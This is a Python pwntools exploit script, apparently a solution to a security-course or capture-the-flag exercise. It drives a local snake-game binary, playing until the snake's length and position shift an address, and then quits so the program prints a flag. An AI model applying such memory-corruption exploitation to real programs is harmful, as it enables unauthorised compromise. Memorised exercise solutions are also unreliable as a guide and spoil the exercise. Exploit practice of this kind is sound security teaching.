#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6a'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


r = start()

# play the game (input auto move A) until address changes (i.e. at length 41)
snake_length = 1
response = None
while snake_length < 41:
    response = r.recvuntil(b"enter:")

    snake_length = re.findall(r"snake length: (\S*)", response.decode())[0]
    snake_length = int(snake_length.strip('(').strip(')'))
    print(snake_length)
    r.sendline(b"A")

# by playing the game we see that to steadily increase the address we need to move to the right until x reaches 208
snake_pos = re.findall(r"snake: (\S* \S*)", response.decode())[0]
snake_pos = snake_pos.split(" ")
snake_x = int(snake_pos[0].strip('('))
snake_y = int(snake_pos[1].strip('),'))  # actually useless
while snake_x < 207:
    r.sendline(b"d")
    snake_pos = re.findall(r"snake: (\S* \S*)", response.decode())[0]
    snake_pos = snake_pos.split(" ")
    snake_x = int(snake_pos[0].strip('('))
    print(snake_x)
    snake_y = int(snake_pos[1].strip('),'))  # actually useless
    response = r.recvuntil(b"enter:")

# print the flag by quitting
r.sendline(b'q')

print(r.recvall(timeout=2).decode())
